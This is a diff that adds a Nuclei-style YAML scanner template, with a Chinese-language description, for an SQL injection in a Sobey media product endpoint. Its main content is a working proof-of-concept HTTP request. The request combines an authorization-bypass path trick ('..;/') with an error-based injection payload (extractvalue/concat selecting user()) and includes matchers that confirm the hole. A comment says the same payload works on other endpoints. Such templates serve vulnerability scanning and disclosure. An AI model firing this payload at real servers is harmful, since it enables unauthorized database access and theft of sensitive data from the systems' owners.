@@ -1,0 +1,32 @@
+id: sobeylingyun-countJztArticleGroupByChannel2-sqli
+info:
+  name: 索贝融媒体 /sobey-mchEditor/mch/Jzt/statistics/countJztArticleGroupByChannel2 SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 索贝产品中的 /sobey-mchEditor/mch/Jzt/statistics/countJztArticleGroupByChannel2 接口存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ekoob2bb7xkav78b
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: 其他接口均使用相同 poc，只是替换接口
+    repair:
+    version:
+  tags: sqli,sobeylingyun
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+extractvalue(1,concat(0x7e,(SELECT+user()))) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Length: 2
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'XPATH syntax error')
+        condition: and
